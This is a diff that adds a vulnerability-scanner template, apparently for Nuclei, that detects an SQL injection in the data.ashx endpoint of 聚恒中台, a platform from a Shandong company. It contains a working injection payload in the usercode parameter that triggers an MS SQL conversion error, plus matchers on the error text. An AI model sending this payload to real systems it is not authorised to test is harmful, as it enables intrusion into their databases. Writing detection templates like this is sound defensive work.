@@ -1,0 +1,32 @@
+id: poc-yaml-ju-heng-data-ashx-sqli
+info:
+  name: 山东聚恒网络技术有限公司聚恒中台 data.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in 山东聚恒网络技术有限公司聚恒中台's data.ashx endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        usercode=1' and 1=(convert(int,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))--&&mobile=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
